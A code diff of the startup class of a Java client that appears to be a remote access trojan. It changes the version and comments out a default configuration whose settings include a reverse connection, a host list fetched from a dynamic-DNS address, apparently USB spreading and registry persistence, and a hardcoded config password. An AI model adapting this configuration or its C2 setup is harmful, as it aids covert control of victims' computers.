@@ -9,7 +9,6 @@ import java.io.RandomAccessFile;
 import java.nio.channels.FileChannel;
 import java.nio.channels.FileLock;
 import java.util.List;
-import network.ConexionServer;
 import rt.util.CLRT;
 import rt.util.UtilRT;
 
@@ -17,7 +16,7 @@ public class Inicio {
 
     public static CFG config;
     public static Interfaz in;//instalador
-    public static String v = "1.5.5";//version
+    public static String v = "1.5.7";//version
     public static String i = "";//identificador
     public static String pCCON = "LAOSUISNPASD12378ASDLGASDHGAKD"; //password del archivo de configuracion
     private static File f;
@@ -85,8 +84,8 @@ public class Inicio {
         System.setProperty("java.net.preferIPv4Stack", "true");
         try {
             String rutaAeliminar = null;
-            boolean eliminarArchivo = false;;
             IniciarCertificado.iniciar();
+            boolean eliminarArchivo = false;
             boolean actualizacion = false;
             boolean servicio = false;
             boolean instaladoServicio = false;
@@ -182,20 +181,24 @@ public class Inicio {
             CLRT cl = new CLRT();
             Inicio.config = (CFG) UtilRT.leerObjeto(cl.descifrar("/cfg.dat"));
         } catch (Exception e) {
-            //configuracion default
-            Inicio.config = new CFG();
-            Inicio.config.inicializarParamertros();
-            Inicio.config.agregarParametro("dns", "");
-            Inicio.config.agregarParametro("puerto", "4000");
-            Inicio.config.agregarParametro("claveClase", "");
-            Inicio.config.agregarParametro("jarName", "");
-            Inicio.config.agregarParametro("nombreUSB", "");
-            Inicio.config.agregarParametro("password", "");
-            Inicio.config.agregarParametro("prefijo", "");
-            Inicio.config.agregarParametro("regName", "");
-            Inicio.config.agregarParametro("ssl", Boolean.TRUE);
-            Inicio.config.agregarParametro("protocolo", ConexionServer.TCP);
-//            Inicio.config.agregarParametro("protocolo", ConexionServer.UDP);
+//            //configuracion default para pruebas en dessarrollo
+//            Inicio.config = new CFG();
+//            Inicio.config.inicializarParamertros();
+//            Inicio.config.agregarParametro("gui", Boolean.FALSE);
+//            Inicio.config.agregarParametro("dns", "");
+//            Inicio.config.agregarParametro("urlDns", "http://rtdns.ddns.net/list.txt");
+//            Inicio.config.agregarParametro("claveClase", "");
+//            Inicio.config.agregarParametro("delay", 0);
+//            Inicio.config.agregarParametro("prefijo", "");
+//            Inicio.config.agregarParametro("off-escritorio", Boolean.FALSE);
+//            Inicio.config.agregarParametro("off-escritorio-delay", 3000);
+//            Inicio.config.agregarParametro("jarName", "");
+//            Inicio.config.agregarParametro("nombreUSB", "");
+//            Inicio.config.agregarParametro("password", "");
+//            Inicio.config.agregarParametro("regName", "");
+//            Inicio.config.agregarParametro("ssl", Boolean.TRUE);
+//            Inicio.config.agregarParametro("tipoConexion", 1);//inversa
+//            Inicio.config.agregarParametro("protocolo", ConexionServer.TCP);
         }
     }
 
